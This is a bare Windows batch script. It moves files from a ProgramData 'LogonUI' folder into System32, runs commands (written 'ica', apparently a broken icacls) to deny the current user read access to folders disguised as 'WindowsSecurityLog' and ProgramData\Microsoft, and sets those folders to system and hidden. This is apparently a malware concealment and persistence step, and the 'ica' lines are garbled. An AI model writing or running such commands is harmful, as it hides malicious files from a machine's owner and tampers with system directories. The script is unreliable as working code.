@echo off
move "C:\Programdata\Microsoft\Network\LogonUI\*" "C:\Windows\System32"
ica "C:\ProgramData\WindowsSecurityLog\0x65" /c /deny %username%:r
ica "C:\ProgramData\WindowsSecurityLog" /c /deny %username%:r
ica "C:\ProgramData\Microsoft" /c /deny %username%:r
attrib +s +h "C:\ProgramData\WindowsSecurityLog\0x65"
attrib +s +h "C:\ProgramData\WindowsSecurityLog"
attrib +s +h "C:\ProgramData\Microsoft"
